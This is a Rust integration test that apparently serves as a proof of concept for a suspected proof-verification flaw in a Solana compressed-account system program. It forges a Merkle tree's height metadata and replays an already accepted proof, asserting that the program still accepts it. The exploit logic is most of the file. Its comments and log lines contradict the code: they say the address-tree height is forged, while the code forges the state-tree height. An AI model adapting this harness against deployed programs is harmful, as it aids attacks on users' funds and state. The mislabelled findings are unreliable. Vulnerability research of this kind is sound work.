#![cfg(feature = "test-sbf")]

use std::collections::HashMap;

use anchor_lang::{
    prelude::borsh::{BorshDeserialize, BorshSerialize},
    Discriminator,
};
use create_address_test_program::create_invoke_cpi_instruction;
use light_batched_merkle_tree::{
    constants::{DEFAULT_BATCH_ADDRESS_TREE_HEIGHT, DEFAULT_BATCH_STATE_TREE_HEIGHT},
    initialize_address_tree::InitAddressTreeAccountsInstructionData,
    initialize_state_tree::InitStateTreeAccountsInstructionData,
    merkle_tree_metadata::BatchedMerkleTreeMetadata,
};
use light_client::rpc::Rpc;
use light_compressed_account::{
    address::{derive_address, pack_new_address_params_assigned},
    instruction_data::{
        data::pack_pubkey_usize,
        with_account_info::InstructionDataInvokeCpiWithAccountInfo,
    },
    compressed_account::{PackedMerkleContext, PackedReadOnlyCompressedAccount},
    Pubkey as LcPubkey,
};
use light_compressed_token::process_transfer::transfer_sdk::to_account_metas;
use light_program_test::{program_test::TestRpc, LightProgramTest, ProgramTestConfig};
use light_prover_client::prover::{spawn_prover, ProverConfig};
use serial_test::serial;
use solana_sdk::{pubkey::Pubkey, signature::Keypair, signer::Signer};
use light_program_test::Indexer;
fn checksum32(data: &[u8]) -> u32 {
    data.iter().fold(0u32, |acc, &b| acc.wrapping_mul(16777619) ^ (b as u32))
}

fn hex_preview(data: &[u8], take: usize) -> String {
    let n = data.len().min(take);
    let mut s = String::new();
    for b in &data[..n] { s.push_str(&format!("{:02x}", b)); }
    s
}

/// Repro using *invoke_cpi_with_account_info*:
/// 1) Build proof with default heights (state=32, address=40).
/// 2) Forge on-chain address-tree height to 1.
/// 3) Reuse the same instruction/proof (do NOT rebuild) — if the OR guard exists,
///    verification still succeeds because state_height==32.
#[tokio::test]
#[serial]
async fn tree_height_or_account_info() {
    eprintln!("==== BEGIN tree_height_or_account_info ====");

    // Prover: spawn external process; keep with_prover=false in ProgramTest
    spawn_prover(ProverConfig::default()).await;

    // Default batched trees (state=32, address=40)
    let mut config = ProgramTestConfig::default_with_batched_trees(false);
    config.with_prover = false;
    config.v2_state_tree_config = Some(InitStateTreeAccountsInstructionData::default());
    config.v2_address_tree_config = Some(InitAddressTreeAccountsInstructionData::test_default());
    config.additional_programs =
        Some(vec![("create_address_test_program", create_address_test_program::ID)]);

    let mut rpc = LightProgramTest::new(config).await.unwrap();
    let env = rpc.test_accounts.clone();
    let payer: Keypair = rpc.get_payer().insecure_clone();

    let addr_tree_pk = env.v2_address_trees[0];
    let state_tree_pk = env.v2_state_trees[0].merkle_tree;
    let state_queue_pk = env.v2_state_trees[0].output_queue; // acts as the "address queue" in this harness

    // Sanity: heights default (state=32, addr=40)
    let state_account = rpc.get_account(state_tree_pk).await.unwrap().unwrap();
    let mut state_slice: &[u8] = &state_account.data[8..8 + BatchedMerkleTreeMetadata::LEN];
    let state_meta = BatchedMerkleTreeMetadata::deserialize(&mut state_slice).unwrap();
    let addr_account = rpc.get_account(addr_tree_pk).await.unwrap().unwrap();
    let mut addr_slice: &[u8] = &addr_account.data[8..8 + BatchedMerkleTreeMetadata::LEN];
    let addr_meta = BatchedMerkleTreeMetadata::deserialize(&mut addr_slice).unwrap();

    eprintln!(
        "INIT heights => state={}, addr={} (expected addr={})",
        state_meta.height,
        addr_meta.height,
        DEFAULT_BATCH_ADDRESS_TREE_HEIGHT
    );
    assert_eq!(state_meta.height, DEFAULT_BATCH_STATE_TREE_HEIGHT);
    assert_eq!(addr_meta.height, DEFAULT_BATCH_ADDRESS_TREE_HEIGHT);

    // -------- 1) Build proof at default heights --------
    // Use the SDK's test indexer over the seeded accounts
    let test_indexer = light_program_test::indexer::TestIndexer::init_from_acounts(&payer, &env, 0).await;

    let seed = [3u8; 32];
    let address = derive_address(&seed, &addr_tree_pk.to_bytes(), &create_address_test_program::ID.to_bytes());
    let addresses_with_tree = vec![light_client::indexer::AddressWithTree { address, tree: addr_tree_pk }];

    let proof_with_context = test_indexer
        .get_validity_proof(Vec::new(), addresses_with_tree.clone(), None)
        .await
        .unwrap()
        .value;

    // Log indices info from proof context
    let addr_root_idx = proof_with_context.get_address_root_indices()[0];
    let state_root_idx = proof_with_context
        .get_root_indices()
        .first()
        .and_then(|x| *x)
        .unwrap_or(0);
    eprintln!(
        "proof ctx => state_root_idx={}, addr_root_idx={}, addresses={} (leaves=0)",
        state_root_idx,
        addr_root_idx,
        addresses_with_tree.len()
    );

    // -------- Build remaining_metas using ONLY SDK packers --------
    let mut remaining: HashMap<LcPubkey, usize> = HashMap::new();

    // 1) Address params FIRST (this inserts address_queue (=state_queue) and address_tree)
    let new_address_params = vec![light_sdk::address::NewAddressParamsAssigned {
        seed,
        address_queue_pubkey: state_queue_pk.into(),        // <--- IMPORTANT: reuse STATE queue
        address_merkle_tree_pubkey: addr_tree_pk.into(),
        address_merkle_tree_root_index: addr_root_idx,      // from the proof
        assigned_account_index: None,
    }];
    let packed_new_address_params = pack_new_address_params_assigned(&new_address_params, &mut remaining);

    // 2) Ensure state queue + state tree are present (idempotent if already inserted)
    let state_queue_idx = pack_pubkey_usize(&state_queue_pk.into(), &mut remaining);
    let state_tree_idx = pack_pubkey_usize(&state_tree_pk.into(), &mut remaining);

    // 3) Convert map -> metas (sorted by index)
    let remaining_metas = to_account_metas(
        remaining.into_iter().map(|(k, v)| (Pubkey::from(k), v)).collect(),
    );

    // Debug: you should see the state queue, address tree, and state tree once each
    eprintln!("--- remaining_metas (order passed) ---");
    for (i, m) in remaining_metas.iter().enumerate() {
        eprintln!("#{}: {} (writable={}, signer={})", i, m.pubkey, m.is_writable, m.is_signer);
    }
    eprintln!(
        "meta summary => total_metas={}, includes state_queue={}, state_tree={}, addr_tree={}",
        remaining_metas.len(),
        state_queue_pk,
        state_tree_pk,
        addr_tree_pk
    );

    // 4) Build one instruction payload and reuse it twice (DON'T rebuild after forging)
    // Insert a read-only STATE input so the verifier picks up state_tree_height=32
    let state_ro_account = PackedReadOnlyCompressedAccount {
        account_hash: [0u8; 32],
        merkle_context: PackedMerkleContext {
            merkle_tree_pubkey_index: state_tree_idx,
            queue_pubkey_index: state_queue_idx,
            leaf_index: 0,
            prove_by_index: false,
        },
        root_index: state_root_idx,
    };

    let ix_data = InstructionDataInvokeCpiWithAccountInfo {
        mode: 0,
        bump: 255,
        invoking_program_id: create_address_test_program::ID.into(),
        compress_or_decompress_lamports: 0,
        is_compress: false,
        with_cpi_context: false,
        with_transaction_hash: false,
        cpi_context: Default::default(),
        proof: proof_with_context.proof.into(),
        new_address_params: packed_new_address_params,
        account_infos: vec![],
        read_only_addresses: vec![],
        read_only_accounts: vec![],
    };

    // Serialize the instruction payload to fingerprint it
    let ix_bytes = [
        light_system_program::instruction::InvokeCpiWithAccountInfo::DISCRIMINATOR.to_vec(),
        ix_data.try_to_vec().unwrap(),
    ]
    .concat();
    eprintln!(
        "ix payload => len={}, checksum32=0x{:08x}, head={}…",
        ix_bytes.len(),
        checksum32(&ix_bytes),
        hex_preview(&ix_bytes, 16)
    );

    let instruction = create_invoke_cpi_instruction(
        payer.pubkey(),
        ix_bytes.clone(),
        remaining_metas.clone(),
        None,
    );

    // ---- Submit #1 (baseline: addr=40, state=32) ----
    let res_before = TestRpc::create_and_send_transaction_with_batched_event(
        &mut rpc,
        &[instruction.clone()],
        &payer.pubkey(),
        &[&payer],
        None,
    )
    .await;
    eprintln!("send #1 => {:?}", res_before.as_ref().map(|_| "ok"));
    assert!(res_before.is_ok(), "baseline must succeed");

   // ---- Forge only STATE height to 1 (AFTER first send) ----
let mut state_acc = rpc.get_account(state_tree_pk).await.unwrap().unwrap();
let mut s: &[u8] = &state_acc.data[8..8 + BatchedMerkleTreeMetadata::LEN];
let mut forged_meta = BatchedMerkleTreeMetadata::deserialize(&mut s).unwrap();
forged_meta.height = 1;
let mut buf = Vec::new();
BatchedMerkleTreeMetadata::serialize(&forged_meta, &mut buf).unwrap();
state_acc.data[8..8 + buf.len()].copy_from_slice(&buf);
rpc.set_account(state_tree_pk, state_acc);

// Sanity: confirm post-forge heights
let state_meta2 = {
    let acc = rpc.get_account(state_tree_pk).await.unwrap().unwrap();
    let mut s: &[u8] = &acc.data[8..8 + BatchedMerkleTreeMetadata::LEN];
    BatchedMerkleTreeMetadata::deserialize(&mut s).unwrap()
};
let addr_meta2 = {
    let acc = rpc.get_account(addr_tree_pk).await.unwrap().unwrap();
    let mut s: &[u8] = &acc.data[8..8 + BatchedMerkleTreeMetadata::LEN];
    BatchedMerkleTreeMetadata::deserialize(&mut s).unwrap()
};
eprintln!("post-forge heights => state={}, addr={}", state_meta2.height, addr_meta2.height);
assert_eq!(addr_meta2.height, DEFAULT_BATCH_ADDRESS_TREE_HEIGHT); // still 40
assert_eq!(state_meta2.height, 1);


    eprintln!(
        "reusing same ix => len={}, checksum32=0x{:08x}",
        ix_bytes.len(),
        checksum32(&ix_bytes)
    );

    // ---- Submit #2 (reuse same instruction/proof) ----
    let res_after = TestRpc::create_and_send_transaction_with_batched_event(
        &mut rpc,
        &[instruction],
        &payer.pubkey(),
        &[&payer],
        None,
    )
    .await;
    eprintln!("send #2 (after forging addr.height=1) => {:?}", res_after.as_ref().map(|_| "ok"));
    assert!(res_after.is_ok(), "should pass after forging addr height due to OR check");

    eprintln!("result: OR guard likely PRESENT (accepted with state_height=32, addr_height=1)");
    eprintln!("==== END tree_height_or_account_info ====");
}
